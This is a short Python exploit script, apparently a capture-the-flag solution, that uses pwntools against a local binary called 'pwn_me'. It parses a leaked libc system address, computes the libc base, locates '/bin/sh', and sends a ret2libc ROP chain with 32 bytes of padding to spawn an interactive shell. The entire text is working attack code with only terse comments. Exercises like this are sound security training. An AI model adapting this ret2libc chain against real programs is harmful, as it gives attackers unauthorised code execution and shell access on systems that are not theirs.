from pwn import *

elf = context.binary = ELF('./pwn_me')
libc = elf.libc
p = process()

#get the leaked address
p.recvuntil('at: ')
system_leak = int(p.recvline(), 16)

#set our libc address according to the leaked address
libc.address = system_leak - libc.sym['system']
log.success('LIBC base: {}'.format(hex(libc.address)))

#get location of binsh from libc
binsh = next(libc.search(b'/bin/sh'))

#build the rop chain
rop = ROP(libc)
rop.raw('A' * 32)
rop.system(binsh)

#send our rop chain
p.sendline(rop.chain())

#Get the shell
p.interactive()
